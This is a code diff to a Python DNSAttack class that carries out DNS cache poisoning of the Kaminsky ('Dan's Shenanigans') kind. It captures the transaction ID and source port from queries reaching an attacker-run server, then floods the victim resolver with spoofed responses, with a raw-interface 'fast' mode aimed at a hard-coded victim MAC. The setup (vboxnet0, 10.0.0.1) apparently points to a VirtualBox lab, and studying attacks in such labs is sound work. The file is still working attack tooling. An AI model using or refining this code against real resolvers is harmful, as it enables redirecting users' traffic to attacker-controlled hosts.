@@ -50,18 +50,19 @@ class DNSAttack:
     #   @param log_function      The function to call when message need to be printed
     #
     #   @todo Implement automatic NS server fetching when no ns_server_ip is passed
+    #   @todo Check if port and IP are valid
 
-    def __init__(self, victim_server_ip, attacked_domain, bad_udp_ip, bad_udp_port,\
-         attacker_ip, ns_server_ip=None ,\
+    def __init__(self, victim_server_ip, attacked_domain, bad_server_data,\
+         attacker_ip, ns_server_ip=None, victim_mac=None,\
              blessing_terminal=None, sigint_handler=None, log_function=lambda msg: None):
         self.victim_server_ip = victim_server_ip
         self.attacker_ip = attacker_ip
         self.domain = attacked_domain
-        self.bad_udp_ip = bad_udp_ip
-        self.bad_udp_port = bad_udp_port
+        self.bad_udp_ip = bad_server_data[0]
+        self.bad_udp_port = bad_server_data[1]
         self.ns_server_ip = ns_server_ip
 
-        self.victim_mac = None
+        self.victim_mac = victim_mac
 
         self.t = blessing_terminal
         self.sigint_handler = sigint_handler
@@ -96,18 +97,18 @@ class DNSAttack:
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) # UDP
         sock.bind((self.bad_udp_ip, self.bad_udp_port))
 
-        print("Listening for incoming DNS request...")
+        self.log("Listening for incoming DNS request...")
 
         while True:
             data, addr = sock.recvfrom(1024) # buffer size is 1024 bytes
-            #print("Received response:", data)
+            #self.log("Response source port :" + str(addr[1]))
             received_id = data[0:2]
 
             initial_id = int.from_bytes(received_id, byteorder='big')
             #print("ID: ", initial_id)
 
             sock.close()
-            return initial_id
+            return (initial_id, addr[1])
 
     ##
     #   @brief Start the process to send the initial query
@@ -153,20 +154,23 @@ class DNSAttack:
 
         self.log("Executing " + str(number_of_tries) + " attacks...")
 
+        self.log("Opening socket...")
+        flood_socket = DNSPoisoning.create_socket(self, 'vboxnet0')
+
 
         while number_of_tries and not succeded:
 
-            time.sleep(3)
+            #time.sleep(3)
             self.log("\n ------ {t.bold}{t.shadow}Attack Number " + str(number_of_tries - num) + "{t.normal} ------\n")
 
             pool = ThreadPool(processes=1)
 
-            self.log("Starting DNS light server")
+            #self.log("Starting DNS light server")
             async_id_result = pool.apply_async(self.get_id)
 
-            time.sleep(2)
+            #time.sleep(2)
             
-            self.log("\n\nStart sending the first request to \"{t.italic}badguy.ru{t.normal}\"")
+            #self.log("\n\nStart sending the first request to \"{t.italic}badguy.ru{t.normal}\"")
             try:
                 self.send_initial_query() #Start the DNS listening server
             except self.InitialQueryFailed:
@@ -174,42 +178,41 @@ class DNSAttack:
                 pool.terminate()    #Terminate the UDP server
                 raise self.CriticalError
 
-            fetched_id = async_id_result.get()  # get the return value from your function.
+            fetched_id, source_port = async_id_result.get()  # get the return value from your function.
 
             self.log("Fetched ID: {t.green}{t.bold}" + str(fetched_id) + "{t.normal}")
+            self.log("Source port: {t.blue}{t.bold}" + str(source_port) + "{t.normal}")
+            #self.log("Ok, let's try to perform \"{t.italic}Dan's Shenanigans{t.normal}\" attack")
 
-            self.log("Ok, let's try to perform \"{t.italic}Dan's Shenanigans{t.normal}\" attack")
 
-
-            poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, '10.0.0.1', fetched_id,\
-                interrupt_handler=self.sigint_handler, log=self.log, blessing_terminal=self.t)
+            poison= DNSPoisoning(self.victim_server_ip, self.domain, self.attacker_ip, '10.0.0.1', fetched_id, sport = source_port,\
+                interrupt_handler=self.sigint_handler, log=self.log, blessing_terminal=self.t, socket=flood_socket)
 
 
             #Attach SIGINT signal to the DNSPoisoning stop handler
             signal.signal(signal.SIGINT, poison.stop_handler)
 
-            self.log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...")
+            #self.log("Now the victim server wait for response, we {t.underline}flood a mass of crafted request{t.normal}...")
 
             if mode == self.Mode.NORMAL:
-                poison.open_socket()
                 poison.start_flooding()
 
             elif mode == self.Mode.FAST:
 
                 poison.set_interface('vboxnet0')
                 poison.set_victim_mac("08:00:27:be:48:1d")
-                poison.open_socket()
-
                 poison.faster_flooding()    #Using the faster version
+        
 
-            time.sleep(5)
 
-            self.log("Checking the attack results")
-            if poison.check_poisoning():
-                self.log("\n\n{t.green}Attack Succeded{t.normal}!!!!")
-                succeded = True
-                time.sleep(2)
-                raise self.SuccessfulAttack
-            else:
-                self.log("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!")
-                num = num - 1
+            #time.sleep(1)
+
+            #self.log("Checking the attack results")
+            #if poison.check_poisoning():
+            #    self.log("\n\n{t.green}Attack Succeded{t.normal}!!!!")
+            #    succeded = True
+            #    time.sleep(2)
+            #    raise self.SuccessfulAttack
+            #else:
+            #    self.log("\n\n{t.red}{t.bold}Attack Failed{t.normal}!!!!")
+            #    num = num - 1
